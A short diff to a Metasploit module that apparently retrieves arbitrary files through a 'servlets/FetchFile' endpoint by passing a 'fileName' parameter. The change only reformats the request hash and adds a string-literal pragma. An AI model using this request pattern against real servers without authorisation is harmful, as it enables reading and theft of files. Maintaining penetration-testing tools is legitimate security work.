@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -97,11 +98,9 @@ Windows and Linux.
       vprint_status("Attempting to get file: #{file_name}")
       begin
         res = send_request_cgi(
-          {
-            'uri'      => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
-            'method'   => 'GET',
-            'vars_get' => { 'fileName' => file_name }
-          }
+          'uri' => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
+          'method'   => 'GET',
+          'vars_get' => { 'fileName' => file_name }
         )
       rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
              Rex::HostUnreachable, Errno::ECONNRESET => e
